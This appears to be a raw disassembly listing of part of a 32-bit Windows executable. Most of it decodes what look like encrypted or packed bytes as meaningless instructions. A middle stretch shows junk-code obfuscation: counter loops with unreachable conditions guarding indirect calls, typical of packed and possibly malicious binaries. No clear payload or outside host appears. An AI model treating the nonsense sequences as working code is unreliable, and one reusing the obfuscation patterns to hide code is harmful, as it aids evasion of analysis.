  41340f:	out    dx,eax
  413410:	adc    edx,ebx
  413412:	loope  0x413430
  413414:	hlt    
  413415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413416:	push   edx
  413417:	jg     0x41345d
  413419:	icebp  
  41341a:	mov    eax,ds:0x1617705
  41341f:	popa   
  413420:	leave  
  413421:	sbb    DWORD PTR [ecx-0x4fdc64f2],eax
  413427:	fcomi  st,st(1)
  413429:	jle    0x41344a
  41342b:	scas   eax,DWORD PTR es:[edi]
  41342c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41342d:	mov    ebp,0xf5a65bc6
  413432:	lea    edi,[esi-0x52]
  413435:	repnz mov ds:0xe10aadcc,al
  41343b:	iret   
  41343c:	mov    eax,ds:0x60764fad
  413441:	sbb    eax,0x1a
  413444:	add    ecx,eax
  413446:	push   esi
  413447:	jae    0x413483
  413449:	or     ebx,DWORD PTR [ebx]
  41344b:	or     esp,DWORD PTR [ebx+esi*4-0x58347cd9]
  413452:	aam    0x31
  413454:	or     eax,0xe8aac816
  413459:	(bad)  
  41345a:	adc    al,0x57
  41345c:	int3   
  41345d:	adc    edi,eax
  41345f:	call   0xe08:0xaceee0e1
  413466:	jnp    0x41349e
  413468:	or     ebp,ecx
  41346a:	clc    
  41346b:	jl     0x413414
  41346d:	loope  0x4134dd
  41346f:	lahf   
  413470:	or     ch,BYTE PTR [ecx]
  413472:	sub    edx,esi
  413474:	mov    bh,0x6d
  413476:	fistp  QWORD PTR [esi-0x3]
  413479:	stos   DWORD PTR es:[edi],eax
  41347a:	imul   ebp,DWORD PTR [edx+0x4b],0x9b5db2c8
  413481:	loope  0x4134c8
  413483:	jno    0x4134ef
  413485:	xchg   edi,eax
  413486:	in     eax,dx
  413487:	mov    esp,0x6f17b429
  41348c:	test   eax,0x4dc1c1fe
  413491:	arpl   WORD PTR [ebp-0x74],di
  413494:	add    bl,BYTE PTR [edi]
  413496:	add    esi,DWORD PTR [ecx+0x7]
  413499:	repz jne 0x4134d9
  41349c:	stos   BYTE PTR es:[edi],al
  41349d:	aad    0xbf
  41349f:	mov    eax,ds:0x703cab3c
  4134a4:	jmp    0x41349e
  4134a6:	(bad)  
  4134a7:	call   DWORD PTR [esi-0x158813f3]
  4134ad:	rcr    BYTE PTR [edi+0x26],1
  4134b0:	in     eax,dx
  4134b1:	mov    dl,0xe9
  4134b3:	push   es
  4134b4:	cwde   
  4134b5:	fwait
  4134b6:	pop    ebx
  4134b7:	std    
  4134b8:	adc    al,0xf6
  4134ba:	pop    eax
  4134bb:	jmp    0x3f5e:0x3a30746e
  4134c2:	pop    ds
  4134c3:	test   eax,0xe24f4776
  4134c8:	ja     0x4134fc
  4134ca:	fwait
  4134cb:	push   0xe2858a80
  4134d0:	mov    fs,WORD PTR [esi-0x1d]
  4134d3:	sub    al,0x83
  4134d5:	sbb    al,0xbf
  4134d7:	sub    dl,0x4b
  4134da:	dec    edi
  4134db:	cmc    
  4134dc:	pop    ebp
  4134dd:	mov    edi,0x77cc180d
  4134e2:	adc    esp,DWORD PTR [edi-0x8c3d6f1]
  4134e8:	pushf  
  4134e9:	mov    BYTE PTR [ebx+0x664ac107],dl
  4134ef:	ja     0x413478
  4134f1:	retf   
  4134f2:	push   ebx
  4134f3:	sbb    al,0x90
  4134f5:	xchg   al,ah
  4134f7:	imul   edx,DWORD PTR [ebp+0x2c],0xfffffff2
  4134fb:	(bad)  
  4134fc:	jbe    0x413540
  4134fe:	pushf  
  4134ff:	inc    eax
  413500:	jno    0x413551
  413502:	cwde   
  413503:	dec    edx
  413504:	mov    ebx,0x70976b26
  413509:	loope  0x41348c
  41350b:	push   eax
  41350c:	retf   
  41350d:	jae    0x41357f
  41350f:	mov    ds:0x35c47b51,al
  413514:	pop    es
  413515:	dec    esp
  413516:	adc    DWORD PTR gs:0xb31efafa,esp
  41351d:	jle    0x41355f
  41351f:	sbb    al,0x43
  413521:	mov    ch,0x3e
  413523:	xchg   esp,eax
  413524:	lahf   
  413525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413526:	sahf   
  413527:	in     al,0x5
  413529:	fcom   DWORD PTR [eax+edi*4-0x4b]
  41352d:	mov    edx,0x961a2706
  413532:	cmp    ch,ah
  413534:	sub    BYTE PTR [eax],bl
  413536:	rcr    BYTE PTR [esi],cl
  413538:	jnp    0x413561
  41353a:	jns    0x41352f
  41353c:	loope  0x4135bd
  41353e:	xchg   esp,eax
  41353f:	je     0x41350e
  413541:	mov    edi,0xe4e0e61e
  413546:	mov    bl,0xc6
  413548:	and    al,0xfb
  41354a:	xor    ah,al
  41354c:	bound  esi,QWORD PTR [esi+eiz*8-0x3b]
  413550:	xchg   esp,eax
  413551:	mov    eax,DWORD PTR [edx]
  413553:	pop    ds
  413554:	imul   ebx,ebp,0x33
  413557:	inc    edi
  413558:	pop    ss
  413559:	cmp    al,0xec
  41355b:	pop    esi
  41355c:	and    dl,dl
  41355e:	and    edi,esp
  413560:	jno    0x41353d
  413562:	adc    eax,0x581b6d12
  413567:	push   ecx
  413568:	stos   BYTE PTR es:[edi],al
  413569:	cwde   
  41356a:	push   ds
  41356b:	and    eax,0xa7cf65c8
  413570:	jle    0x41354b
  413572:	(bad)  
  413574:	adc    esp,ebp
  413576:	and    edx,DWORD PTR [esi-0x5a014516]
  41357c:	push   ebp
  41357d:	mov    BYTE PTR [ebx+0x4100310f],dh
  413583:	xor    BYTE PTR [ecx-0x43],0x60
  413587:	into   
  413588:	mul    DWORD PTR [edi-0x78]
  41358b:	mov    al,0x53
  41358d:	jmp    0xb4526b29
  413592:	aaa    
  413593:	cld    
  413594:	inc    edx
  413595:	mov    ebp,0x41534ea6
  41359a:	mov    ds:0x5ce94cf,eax
  41359f:	or     al,0x2c
  4135a1:	loope  0x4135e5
  4135a3:	mov    ecx,ebx
  4135a5:	stc    
  4135a6:	in     eax,dx
  4135a7:	jp     0x413581
  4135a9:	mov    eax,0xeb702a68
  4135ae:	mov    ebx,0xc01a7025
  4135b3:	sub    ebp,esi
  4135b5:	fild   WORD PTR [edi]
  4135b7:	pop    ss
  4135b8:	hlt    
  4135b9:	and    eax,0x65876b0
  4135be:	int    0x2f
  4135c0:	test   al,0x5a
  4135c2:	sbb    al,0xea
  4135c4:	pop    ds
  4135c5:	fxch   st(5)
  4135c7:	sub    ecx,DWORD PTR [ecx+0x4ac7f2c3]
  4135cd:	lea    si,[esi*4-0x6b0d2255]
  4135d5:	xchg   ebx,eax
  4135d6:	cmc    
  4135d7:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135d9:	outs   dx,DWORD PTR ds:[esi]
  4135da:	add    ecx,DWORD PTR [ebx-0x73]
  4135dd:	sbb    ebx,DWORD PTR [eax]
  4135df:	lahf   
  4135e0:	mov    bh,0xdd
  4135e2:	or     BYTE PTR [ecx],dh
  4135e4:	push   esi
  4135e5:	inc    eax
  4135e6:	rol    esp,cl
  4135e8:	pop    eax
  4135e9:	jmp    0x4135ca
  4135eb:	pop    esp
  4135ec:	xchg   esi,eax
  4135ed:	cmp    ah,dl
  4135ef:	xchg   edi,eax
  4135f0:	jmp    0xac2db96e
  4135f5:	add    cl,dl
  4135f7:	cwde   
  4135f8:	(bad)  
  4135f9:	or     ecx,DWORD PTR ds:0xdc54339f
  4135ff:	fnsave [edi-0x35042a99]
  413605:	mov    esi,0x926bfcd7
  41360a:	jecxz  0x413653
  41360c:	inc    ebx
  41360d:	dec    esi
  41360e:	jecxz  0x4135b2
  413610:	and    al,0x4
  413612:	(bad)  
  413613:	jl     0x4135d7
  413615:	mov    DWORD PTR [eax],ebp
  413617:	data16 mov ah,0xf
  41361a:	xchg   ebx,eax
  41361b:	xor    al,0xf7
  41361d:	(bad)  
  41361e:	(bad)  
  41361f:	sub    eax,0xe048a23b
  413624:	xchg   ebx,eax
  413625:	fidiv  DWORD PTR [esi+0x6]
  413628:	fwait
  413629:	add    al,0x65
  41362b:	xchg   edi,eax
  41362c:	jge    0x41363e
  41362e:	lods   al,BYTE PTR ds:[esi]
  41362f:	jnp    0x4135dd
  413631:	xor    dl,bl
  413633:	add    eax,0x38c59fba
  413638:	xchg   esp,eax
  413639:	data16 loop 0x413642
  41363c:	jg     0x413682
  41363e:	add    BYTE PTR [ebx],bl
  413640:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413642:	stos   BYTE PTR es:[edi],al
  413643:	cmp    BYTE PTR [edx+eiz*1+0x54671bd0],0x28
  41364b:	psrlq  mm4,QWORD PTR [edi]
  41364e:	inc    edx
  41364f:	mov    al,ds:0x38175374
  413654:	je     0x413602
  413656:	push   ebx
  413657:	add    ah,cl
  413659:	jmp    0xa606889f
  41365e:	es sahf 
  413660:	xchg   esp,eax
  413661:	jnp    0x41364e
  413663:	or     DWORD PTR [esi+0x57],0x3a
  413667:	test   al,0xd2
  413669:	adc    ch,BYTE PTR [edx+0x18cbda0b]
  41366f:	in     al,dx
  413670:	ds inc edi
  413672:	fsub   QWORD PTR [edx]
  413674:	adc    ebp,ecx
  413676:	call   0xbff3:0x56f3ccb2
  41367d:	out    dx,eax
  41367e:	or     eax,0xd9161229
  413683:	enter  0x8243,0x6
  413687:	jns    0x413705
  413689:	sub    DWORD PTR ds:0xc371d286,edi
  41368f:	or     eax,0x5ea5c498
  413694:	sbb    eax,0xec790d99
  413699:	dec    esi
  41369a:	adc    al,0x5a
  41369c:	adc    DWORD PTR [eax-0x2047a1e],ebx
  4136a2:	pop    ebp
  4136a3:	jmp    0x32b31a28
  4136a8:	fs addr16 dec ecx
  4136ab:	ja     0x413718
  4136ad:	dec    esp
  4136ae:	sbb    dl,BYTE PTR [esi-0x5f]
  4136b1:	push   esi
  4136b2:	leave  
  4136b3:	loope  0x4136d0
  4136b5:	rcl    dh,cl
  4136b7:	fcmovnu st,st(0)
  4136b9:	push   eax
  4136ba:	ret    
  4136bb:	jne    0x41371a
  4136bd:	arpl   WORD PTR [edx-0x49],bp
  4136c0:	xor    DWORD PTR ds:0x5804cbfe,esp
  4136c6:	xor    cl,BYTE PTR [ecx+0x3afc99e6]
  4136cc:	sbb    ecx,0xffffffcf
  4136cf:	adc    ebx,DWORD PTR [ecx-0x3c]
  4136d2:	or     eax,0x91a8e75
  4136d7:	adc    DWORD PTR [ebx],edi
  4136d9:	inc    edx
  4136da:	pop    ss
  4136db:	xor    eax,0x83633b9c
  4136e0:	cmp    bh,BYTE PTR [ecx]
  4136e2:	add    ebp,edi
  4136e4:	adc    bh,BYTE PTR [eax]
  4136e6:	sub    BYTE PTR [esi-0x4],0x1e
  4136ea:	mov    dh,0x32
  4136ec:	xlat   BYTE PTR ds:[ebx]
  4136ed:	push   edx
  4136ee:	ins    BYTE PTR es:[edi],dx
  4136ef:	leave  
  4136f0:	nop
  4136f1:	pop    ebx
  4136f2:	dec    edx
  4136f3:	mov    ah,0x8b
  4136f5:	cld    
  4136f6:	daa    
  4136f7:	jmp    0xe0fe78c
  4136fc:	fidiv  DWORD PTR ds:0xbf5bcf6d
  413702:	mov    ds:0x7fde4c95,al
  413707:	adc    DWORD PTR [ebx+0x72],0xffffffd6
  41370b:	jmp    0xadc48ebe
  413710:	xchg   bh,dl
  413712:	cmp    edx,DWORD PTR [ebp-0x37a04952]
  413718:	mov    bh,0xa7
  41371a:	idiv   BYTE PTR [edx+0x0]
  41371d:	retf   
  41371e:	sbb    BYTE PTR [ebx-0x2bb3745c],0xeb
  413725:	cmp    dl,BYTE PTR [ebx+0x3c]
  413728:	sbb    eax,0x9c3cd0b2
  41372d:	sub    BYTE PTR [edi],0xdb
  413730:	test   esp,ecx
  413732:	cmp    al,0x5
  413734:	xchg   ecx,eax
  413735:	sbb    dh,BYTE PTR [eax+0x40]
  413738:	sub    DWORD PTR ds:0xa396d8bf,0xffffffb5
  41373f:	clc    
  413740:	aam    0x47
  413742:	js     0x4136d2
  413744:	sbb    dl,BYTE PTR [ecx]
  413746:	mov    dh,BYTE PTR [esi]
  413748:	rcr    BYTE PTR [esi+0x67],cl
  41374b:	popf   
  41374c:	popf   
  41374d:	adc    eax,0x3aa251f3
  413752:	push   ebp
  413753:	mov    DWORD PTR [ebx-0x490efc2e],ecx
  413759:	daa    
  41375a:	nop
  41375b:	push   ss
  41375c:	scas   al,BYTE PTR es:[edi]
  41375d:	lods   eax,DWORD PTR ds:[esi]
  41375e:	xor    al,0x3c
  413760:	into   
  413761:	push   eax
  413762:	or     al,0x43
  413764:	xchg   edi,eax
  413765:	and    eax,0x230d2ab6
  41376a:	out    0xbd,eax
  41376c:	mov    edi,0x69abf022
  413771:	mov    BYTE PTR [edx-0x177d02ec],al
  413777:	(bad)  
  413778:	mul    BYTE PTR [ebx+0x6c05f366]
  41377e:	sub    bh,BYTE PTR [edi-0x1a9b222]
  413784:	add    al,0xc9
  413786:	cmp    eax,0x36126b3
  41378b:	pusha  
  41378c:	mov    ebp,DWORD PTR [ebp+0x1b]
  41378f:	retf   
  413790:	mov    ebx,0xe6d7f81e
  413795:	idiv   DWORD PTR [edx]
  413797:	xchg   edi,eax
  413798:	sar    BYTE PTR [eax-0x6c9c7b45],0xeb
  41379f:	fcom   QWORD PTR [ebx-0x1c]
  4137a2:	xor    DWORD PTR [edx+0x1b],ebp
  4137a5:	fs inc esp
  4137a7:	fisttp QWORD PTR [eax]
  4137a9:	in     al,0x68
  4137ab:	and    DWORD PTR [esi+eiz*8+0x3241b92d],ebx
  4137b2:	push   esp
  4137b3:	data16 (bad) 
  4137b6:	pop    es
  4137b7:	inc    eax
  4137b8:	mov    bh,0x21
  4137ba:	push   esi
  4137bb:	pop    ebx
  4137bc:	mov    ?,WORD PTR [ebp-0x1580657d]
  4137c2:	push   cs
  4137c3:	loop   0x4137c0
  4137c5:	into   
  4137c6:	es dec ebp
  4137c8:	addr16 and eax,0xc8ed01ee
  4137ce:	jmp    0x4137c5
  4137d0:	sub    eax,0x5ff7bfc
  4137d5:	iretw  
  4137d7:	nop
  4137d8:	adc    dh,BYTE PTR [edx]
  4137da:	dec    eax
  4137db:	popa   
  4137dc:	pop    ebp
  4137dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137de:	xchg   ebp,eax
  4137df:	fld    QWORD PTR [ebp-0x7e]
  4137e2:	sti    
  4137e3:	xchg   DWORD PTR [ebx+0x3f],ebx
  4137e6:	iret   
  4137e7:	outs   dx,BYTE PTR ds:[esi]
  4137e8:	ds shl bh,cl
  4137eb:	jo     0x41383d
  4137ed:	pop    ecx
  4137ee:	push   esp
  4137ef:	adc    esp,DWORD PTR ds:0x13af2d58
  4137f5:	out    0x52,eax
  4137f7:	add    DWORD PTR [esi],edx
  4137f9:	jb     0x4137b9
  4137fb:	or     al,0x24
  4137fd:	jl     0x4137c4
  4137ff:	daa    
  413800:	loopne 0x413806
  413802:	jnp    0x4137bd
  413804:	sub    eax,0x33dd6991
  413809:	retf   0x8a02
  41380c:	dec    esi
  41380d:	lods   al,BYTE PTR ds:[esi]
  41380e:	jg     0x413870
  413810:	sar    DWORD PTR [edx-0x77],0x46
  413814:	sbb    DWORD PTR [esi-0x2b],eax
  413817:	add    BYTE PTR [esi-0x41],ch
  41381a:	add    ah,BYTE PTR [ecx+0x16]
  41381d:	pop    esp
  41381e:	data16 stc 
  413820:	jg     0x4137ee
  413822:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413823:	cld    
  413824:	popf   
  413825:	rcl    DWORD PTR [ecx],cl
  413827:	fs fwait
  413829:	nop
  41382a:	and    ah,BYTE PTR [eax+eiz*1-0x3b83c8c0]
  413831:	ror    al,1
  413833:	jo     0x4138b0
  413835:	aas    
  413836:	push   es
  413837:	mov    bh,BYTE PTR [ecx-0x26]
  41383a:	inc    ecx
  41383b:	add    esi,DWORD PTR [edx+eiz*4+0x2bb22b2d]
  413842:	add    bl,BYTE PTR [ebx+0x3b]
  413845:	(bad)  
  413846:	mov    bh,0x57
  413848:	cld    
  413849:	xchg   edi,eax
  41384a:	or     ecx,esp
  41384c:	ret    
  41384d:	into   
  41384e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41384f:	fs dec bx
  413852:	lods   al,BYTE PTR ds:[esi]
  413853:	add    al,0x42
  413855:	int3   
  413856:	or     al,0x69
  413858:	and    BYTE PTR ds:0xeb5eea3f,dh
  41385e:	rol    DWORD PTR [ecx],cl
  413860:	mov    edi,DWORD PTR [esi]
  413862:	ror    BYTE PTR ds:0xd3136efb,1
  413868:	addr16 pushf 
  41386a:	or     esi,ecx
  41386c:	or     BYTE PTR ds:0x28665724,dh
  413872:	leave  
  413873:	jp     0x413847
  413875:	or     BYTE PTR [eax+esi*8-0x17],bl
  413879:	mov    ecx,es
  41387b:	dec    edx
  41387c:	jns    0x413893
  41387e:	cwde   
  41387f:	pop    ebp
  413880:	dec    edx
  413881:	daa    
  413882:	xlat   BYTE PTR ds:[ebx]
  413883:	lea    ebp,[ecx-0x145066a2]
  413889:	fst    DWORD PTR [ebx+0x68659ac]
  41388f:	push   edi
  413890:	push   eax
  413891:	sbb    eax,0xbd28ebf6
  413896:	jmp    0xdfdde8db
  41389b:	dec    edi
  41389c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41389d:	imul   esi,DWORD PTR [ebp-0x70],0xffffff95
  4138a1:	int3   
  4138a2:	aad    0x29
  4138a4:	test   al,0x10
  4138a6:	inc    ebp
  4138a7:	cmp    BYTE PTR [edx-0x1130451e],bl
  4138ad:	fstp   QWORD PTR [eax+0x49eae7ae]
  4138b3:	gs pop ebp
  4138b5:	mov    bl,BYTE PTR [edx]
  4138b7:	(bad)  
  4138b8:	add    dl,bh
  4138ba:	or     DWORD PTR [eax-0x46],0xfffffff9
  4138be:	(bad)  
  4138bf:	xchg   edi,eax
  4138c0:	jmp    0x7ef3b759
  4138c5:	outs   dx,DWORD PTR ds:[esi]
  4138c6:	push   esp
  4138c7:	adc    dl,BYTE PTR [ecx]
  4138c9:	daa    
  4138ca:	into   
  4138cb:	lock sub eax,0xabd876ed
  4138d1:	add    ebx,ebx
  4138d3:	jmp    0x84de:0xa1aedd8a
  4138da:	pop    es
  4138db:	retf   
  4138dc:	les    esp,FWORD PTR [esi+0x3ee35b76]
  4138e2:	push   ecx
  4138e3:	xor    ebx,eax
  4138e5:	and    DWORD PTR ds:0x42b01c,0x4e66
  4138ef:	sub    edx,ebx
  4138f1:	sub    edx,esi
  4138f3:	adc    DWORD PTR ds:0x42c014,0x3307
  4138fd:	xor    edx,eax
  4138ff:	add    DWORD PTR ds:0x42d004,0x3241
  413909:	mov    DWORD PTR [ebp+0x8],edx
  41390c:	or     ebx,ebx
  41390e:	mov    edx,DWORD PTR [ebp+0x8]
  413911:	mov    ebx,DWORD PTR [ebp-0x58]
  413914:	sub    DWORD PTR ds:0x429004,0x42c00c
  41391e:	add    edx,0x5708c4
  413924:	imul   edx,ebx
  413927:	mov    DWORD PTR [ebp-0x58],edx
  41392a:	mov    edx,DWORD PTR [ebp+0x8]
  41392d:	and    DWORD PTR ds:0x42d01c,0x0
  413937:	mov    ebx,DWORD PTR ds:0x42d01c
  41393d:	inc    ebx
  41393e:	mov    DWORD PTR ds:0x42d01c,ebx
  413944:	cmp    DWORD PTR ds:0x42d01c,0x29
  41394b:	jne    0x41395a
  413951:	push   DWORD PTR [ebp-0x24]
  413954:	call   DWORD PTR ds:0x42e913
  41395a:	cmp    DWORD PTR ds:0x42d01c,0x1e
  413961:	jb     0x413937
  413967:	and    DWORD PTR ds:0x42d004,0x0
  413971:	mov    ebx,DWORD PTR ds:0x42d004
  413977:	inc    ebx
  413978:	mov    DWORD PTR ds:0x42d004,ebx
  41397e:	cmp    DWORD PTR ds:0x42d004,0x7
  413985:	jne    0x4139a0
  41398b:	push   0x1baa
  413990:	push   0x42e075
  413995:	push   0x429010
  41399a:	call   DWORD PTR ds:0x42e917
  4139a0:	cmp    DWORD PTR ds:0x42d004,0x6
  4139a7:	jne    0x4139ba
  4139ad:	mov    ebx,DWORD PTR ds:0x42d004
  4139b3:	inc    ebx
  4139b4:	mov    DWORD PTR ds:0x42d004,ebx
  4139ba:	cmp    DWORD PTR ds:0x42d004,0x14
  4139c1:	jb     0x413971
  4139c7:	add    DWORD PTR ds:0x42d000,edx
  4139cd:	mov    ebx,DWORD PTR [ebp-0x54]
  4139d0:	mov    DWORD PTR ds:0x42b008,0x4ad3
  4139da:	add    edx,0x64f8da
  4139e0:	or     edx,ebx
  4139e2:	add    DWORD PTR ds:0x42c008,0x5d21
  4139ec:	mov    DWORD PTR [ebp-0x54],edx
  4139ef:	mov    edx,DWORD PTR [ebp+0x8]
  4139f2:	mov    ebx,DWORD PTR [ebp-0x50]
  4139f5:	and    DWORD PTR ds:0x42b008,0x3404
  4139ff:	add    edx,ecx
  413a01:	xor    DWORD PTR ds:0x42a000,0x42d000
  413a0b:	xor    edx,ebx
  413a0d:	mov    DWORD PTR [ebp-0x50],edx
  413a10:	add    ebx,edx
  413a12:	mov    edx,DWORD PTR [ebp+0x8]
  413a15:	adc    DWORD PTR ds:0x429008,edx
  413a1b:	mov    ebx,DWORD PTR [ebp-0x4c]
  413a1e:	or     DWORD PTR ds:0x429028,0x42d010
  413a28:	add    edx,edi
  413a2a:	or     DWORD PTR ds:0x429008,0x429010
  413a34:	and    edx,ebx
  413a36:	xor    DWORD PTR ds:0x429028,ecx
  413a3c:	mov    DWORD PTR [ebp-0x4c],edx
  413a3f:	mov    DWORD PTR ds:0x42c004,0x18
  413a49:	cmp    DWORD PTR ds:0x42c004,0x0
  413a50:	je     0x413a93
  413a56:	cmp    DWORD PTR ds:0x42c004,0x1e
  413a5d:	jne    0x413a7b
  413a63:	push   0x42a004
  413a68:	push   0x2285
  413a6d:	push   DWORD PTR [ebp-0x24]
  413a70:	push   0x1fc0
  413a75:	call   DWORD PTR ds:0x42e8cf
  413a7b:	mov    ebx,DWORD PTR ds:0x42c004
  413a81:	dec    ebx
  413a82:	mov    DWORD PTR ds:0x42c004,ebx
  413a88:	jmp    0x413a49
  413a8d:	add    DWORD PTR ds:0x42d00c,ecx
  413a93:	mov    edx,DWORD PTR [ebp+0x8]
  413a96:	sbb    ebx,DWORD PTR ds:0x42a00c
  413a9c:	mov    ebx,DWORD PTR [ebp-0x48]
  413a9f:	lea    edx,[ebx+edx*1+0x241fc1f]
  413aa6:	mov    DWORD PTR [ebp-0x48],edx
  413aa9:	inc    edx
  413aaa:	mov    edx,DWORD PTR [ebp+0x8]
  413aad:	movzx  ebx,BYTE PTR ds:0x429000
  413ab4:	sbb    DWORD PTR ds:0x42c018,ebx
  413aba:	mov    ebx,0xfa5e15e2
  413abf:	sub    ebx,edx
  413ac1:	add    ebx,DWORD PTR [ebp-0x44]
  413ac4:	and    DWORD PTR ds:0x42c018,0x0
  413ace:	jmp    0x413ae0
  413ad3:	mov    edx,DWORD PTR ds:0x42c018
  413ad9:	inc    edx
  413ada:	mov    DWORD PTR ds:0x42c018,edx
  413ae0:	cmp    DWORD PTR ds:0x42c018,0x15
  413ae7:	jae    0x413b1a
  413aed:	cmp    DWORD PTR ds:0x42c018,0x18
  413af4:	jne    0x413b0f
  413afa:	push   0x88b0
  413aff:	push   0x8c9b
  413b04:	push   0x27a5
  413b09:	call   DWORD PTR ds:0x42e8d3
  413b0f:	jmp    0x413ad3
  413b14:	or     DWORD PTR ds:0x42b004,edx
  413b1a:	mov    DWORD PTR [ebp-0x44],ebx
  413b1d:	mov    DWORD PTR ds:0x42d00c,0x11
  413b27:	cmp    DWORD PTR ds:0x42d00c,0x0
  413b2e:	je     0x413b75
  413b34:	cmp    DWORD PTR ds:0x42d00c,0x1d
  413b3b:	jne    0x413b59
  413b41:	push   0x88e0
  413b46:	push   DWORD PTR [ebp-0x18]
  413b49:	push   0x3079
  413b4e:	push   0x26f3
  413b53:	call   DWORD PTR ds:0x42e8d7
  413b59:	mov    edx,DWORD PTR ds:0x42d00c
  413b5f:	dec    edx
  413b60:	mov    DWORD PTR ds:0x42d00c,edx
  413b66:	jmp    0x413b27
  413b6b:	add    DWORD PTR ds:0x42a014,0x1458
  413b75:	mov    edx,DWORD PTR [ebp+0x8]
  413b78:	xor    DWORD PTR ds:0x429008,0x1867
  413b82:	xor    edx,eax
  413b84:	mov    DWORD PTR ds:0x42900c,0x6609
  413b8e:	add    edx,esi
  413b90:	mov    DWORD PTR ds:0x42d008,0x7de
  413b9a:	jne    0x41157e
  413ba0:	mov    DWORD PTR ds:0x42a008,0x2294
  413baa:	jmp    0x41cc2e
  413baf:	xor    edx,edx
  413bb1:	add    edx,DWORD PTR ds:0x42d014
  413bb7:	sbb    DWORD PTR ds:0x429008,edx
  413bbd:	mov    edx,DWORD PTR [ebp-0xc]
  413bc0:	mov    DWORD PTR ds:0x429010,0x17
  413bca:	cmp    DWORD PTR ds:0x429010,0x0
  413bd1:	je     0x413c04
  413bd7:	cmp    DWORD PTR ds:0x429010,0x18
  413bde:	jne    0x413bea
  413be4:	call   DWORD PTR ds:0x42e91b
  413bea:	xor    ebx,ebx
  413bec:	add    ebx,DWORD PTR ds:0x429010
  413bf2:	dec    ebx
  413bf3:	mov    DWORD PTR ds:0x429010,ebx
  413bf9:	jmp    0x413bca
  413bfe:	or     DWORD PTR ds:0x42c014,ebx
  413c04:	sub    edx,esi
  413c06:	xor    edx,eax
  413c08:	mov    ebx,DWORD PTR ds:0x41cdd0
  413c0e:	mov    ebx,DWORD PTR [ebx]
  413c10:	sub    DWORD PTR ds:0x42b018,ebx
  413c16:	mov    DWORD PTR [ebp-0x5c],edx
  413c19:	and    DWORD PTR ds:0x42b004,0x0
  413c23:	jmp    0x413c35
  413c28:	mov    ebx,DWORD PTR ds:0x42b004
  413c2e:	inc    ebx
  413c2f:	mov    DWORD PTR ds:0x42b004,ebx
  413c35:	cmp    DWORD PTR ds:0x42b004,0x1c
  413c3c:	jae    0x413c60
  413c42:	cmp    DWORD PTR ds:0x42b004,0x24
  413c49:	jne    0x413c5b
  413c4f:	push   DWORD PTR [ebp-0x1c]
  413c52:	push   DWORD PTR [ebp-0x10]
  413c55:	call   DWORD PTR ds:0x42e91f
  413c5b:	jmp    0x413c28
  413c60:	mov    edx,DWORD PTR [ebp-0x10]
  413c63:	mov    ebx,DWORD PTR [ebp-0x8]
  413c66:	xor    edx,eax
  413c68:	xor    ebx,eax
  413c6a:	sub    edx,ebx
  413c6c:	sub    edx,esi
  413c6e:	xor    edx,eax
  413c70:	mov    DWORD PTR [ebp-0x10],edx
  413c73:	mov    edx,DWORD PTR [ebp-0x14]
  413c76:	mov    DWORD PTR [ebp+0x8],edx
  413c79:	jmp    0x416037
  413c7e:	mov    edx,DWORD PTR [ebp+0x8]
  413c81:	mov    ebx,DWORD PTR [ebp-0x8]
  413c84:	xor    edx,eax
  413c86:	xor    ebx,eax
  413c88:	sub    edx,ebx
  413c8a:	sub    edx,esi
  413c8c:	xor    edx,eax
  413c8e:	mov    DWORD PTR [ebp+0x8],edx
  413c91:	mov    edx,DWORD PTR [ebp+0x8]
  413c94:	mov    ebx,DWORD PTR [ebp-0x58]
  413c97:	add    edx,0x5708c4
  413c9d:	imul   edx,ebx
  413ca0:	mov    DWORD PTR [ebp-0x58],edx
  413ca3:	mov    edx,DWORD PTR [ebp+0x8]
  413ca6:	mov    ebx,DWORD PTR [ebp-0x54]
  413ca9:	add    edx,0x64f8da
  413caf:	or     edx,ebx
  413cb1:	mov    DWORD PTR [ebp-0x54],edx
  413cb4:	mov    edx,DWORD PTR [ebp+0x8]
  413cb7:	mov    ebx,DWORD PTR [ebp-0x50]
  413cba:	add    edx,ecx
  413cbc:	jmp    0x416005
  413cc1:	xchg   ecx,eax
  413cc2:	mov    bh,BYTE PTR [edx]
  413cc4:	aad    0x3
  413cc6:	mov    ch,0x93
  413cc8:	mov    ah,al
  413cca:	xor    ebx,ecx
  413ccc:	ja     0x413c69
  413cce:	jo     0x413d0b
  413cd0:	mov    esp,0x7c7c8a14
  413cd5:	inc    eax
  413cd6:	pop    edi
  413cd7:	jl     0x413d55
  413cd9:	cmp    dh,dh
  413cdb:	cmp    dh,BYTE PTR [edi+eax*4+0x4c]
  413cdf:	or     BYTE PTR [ecx],bh
  413ce1:	loop   0x413cb8
  413ce3:	and    ch,BYTE PTR [edx]
  413ce5:	inc    ecx
  413ce6:	inc    ecx
  413ce7:	jle    0x413d65
  413ce9:	jmp    0x413c89
  413ceb:	shl    BYTE PTR [edx+0x43a73816],cl
  413cf1:	dec    edx
  413cf2:	sub    bh,BYTE PTR [ecx-0x34]
  413cf5:	mov    ecx,0xcb5626f5
  413cfa:	fs (bad) 
  413cfc:	fsub   st(1),st
  413cfe:	fisub  WORD PTR [ebp-0x602c74f6]
  413d04:	into   
  413d05:	retf   
  413d06:	mov    eax,0x5b9c0be8
  413d0b:	xor    al,0x8b
  413d0d:	xchg   edi,eax
  413d0e:	sbb    ah,BYTE PTR [eax]
  413d10:	jmp    0xc2cf:0xcdf14548
  413d17:	fs or  eax,0xd0a7fe7a
  413d1d:	jo     0x413cd1
  413d1f:	push   0x12
  413d21:	test   eax,0x657d8a5b
  413d26:	inc    ebx
  413d27:	stc    
  413d28:	sbb    esi,eax
  413d2a:	(bad)  
  413d2b:	xchg   BYTE PTR [esi+eiz*2-0x62],dl
  413d2f:	lds    edi,FWORD PTR [ebx+edx*4]
  413d32:	mov    ss,WORD PTR [ecx+0x61]
  413d35:	inc    ecx
  413d36:	sub    dl,dl
  413d38:	retf   
  413d39:	(bad)  
  413d3a:	in     al,dx
  413d3b:	lock push ecx
  413d3d:	enter  0x95fd,0xff
  413d41:	sub    eax,0x71e0d089
  413d46:	iret   
  413d47:	jp     0x413d15
